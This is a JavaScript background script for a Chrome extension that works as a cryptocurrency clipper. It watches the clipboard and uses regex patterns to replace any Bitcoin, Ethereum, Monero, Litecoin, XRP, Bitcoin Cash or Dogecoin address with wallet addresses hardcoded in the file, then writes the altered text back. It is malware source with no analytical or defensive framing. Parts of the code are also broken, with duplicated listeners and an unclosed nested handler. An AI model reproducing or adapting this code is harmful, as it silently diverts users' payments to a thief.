// Listen for clipboard changes
chrome.runtime.onInstalled.addListener(() => {
  console.log('Extension Installed');
});

chrome.runtime.onStartup.addListener(() => {
  console.log('Extension Started');
});

// Listen for clipboard changes
chrome.runtime.onInstalled.addListener(() => {
  console.log('Extension Installed');
});

chrome.runtime.onStartup.addListener(() => {
  console.log('Extension Started');
});

// Listen for clipboard changes
chrome.clipboard.onClipboardDataChanged.addListener(() => {
  chrome.clipboard.readText((clipboardContent) => {
    console.log('Clipboard Content:', clipboardContent);

    // Regex pattern to match
  const regexReplacements = [
  {
    pattern: /\b(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[0-9A-Za-z]{6,75})\b/,
    replacement: "bc1q5vgyfh6zcjd80nlzkkdsc97vvv33wl53l4a9kf"
  },
  {
    pattern: /\b(4[0-9A-Za-z]{94})\b/,
    replacement: "84nCb2Jq9H1GwTXa2716GdV4dNUtdxz3Wet69YCy9FUPjjnjMvTBq53ZqE6ZpUDQYq4H3wXNNvGV5Ddh9FLDRhpi2WWWBKo"
  },
  {
    pattern: /\b(8[0-9A-Za-z]{94})\b/,
    replacement: "84nCb2Jq9H1GwTXa2716GdV4dNUtdxz3Wet69YCy9FUPjjnjMvTBq53ZqE6ZpUDQYq4H3wXNNvGV5Ddh9FLDRhpi2WWWBKo"
  },
  {
    pattern: /\b(0x[a-fA-F0-9]{40})\b/,
    replacement: "0xf75680937f4aa02a7d6a453e8d98eb1fcd964e4f"
  },
  {
    pattern: /\b([LM3][a-km-zA-HJ-NP-Z1-9]{26,33})\b/,
    replacement: "LSpAKaVJP3ztFrwsRH4fN5HE5smHzv6uYm"
  },
  {
    pattern: /\b([rR][a-km-zA-HJ-NP-Z1-9]{24,34})\b/,
    replacement: "rHcXrn8joXL2Qe7BaMnhB5VRuj1XKEmUW6"
  },
  {
    pattern: /\b(1[0-9a-km-zA-HJ-NP-Z]{25,34})\b/,
    replacement: "bitcoincash:qz06z94a43zxaajlr25ln802fc9esyg0tcfrqsn84r"
  },
  {
    pattern: /\b((bitcoincash:)?(q|p)[a-z0-9]{41})\b/,
    replacement: "bitcoincash:qz06z94a43zxaajlr25ln802fc9esyg0tcfrqsn84r"
  },
  {
    pattern: /\b([qpzry9x8gf2tvdw0s3jn54khce6mua7l]{42})\b/,
    replacement: "bitcoincash:qz06z94a43zxaajlr25ln802fc9esyg0tcfrqsn84r"
  },
  {
    pattern: /\b(1[1-9A-HJ-NP-Za-km-z]{25,34}|3[1-9A-HJ-NP-Za-km-z]{25,34}|bc1[0-9A-Za-z]{25,39})\b/,
    replacement: "bc1q5vgyfh6zcjd80nlzkkdsc97vvv33wl53l4a9kf"
  },
  {
    pattern: /\b(D[a-km-zA-HJ-NP-Z1-9]{25,34}|9[a-km-zA-HJ-NP-Z1-9]{25,34})\b/,
    replacement: "DCu4KDPTFzpujLKBszd4KCnZFxUfm1GcoR"
  }
];

chrome.clipboard.onClipboardDataChanged.addListener(() => {
  chrome.clipboard.readText((clipboardContent) => {
    console.log('Clipboard Content:', clipboardContent);

    // Iterate over each regex pattern and replacement
    regexReplacements.forEach(({ pattern, replacement }) => {
      // Perform regex matching and replacement
      clipboardContent = clipboardContent.replace(pattern, replacement);
    });

    // Write back to clipboard
    chrome.clipboard.writeText(clipboardContent);
  });
});
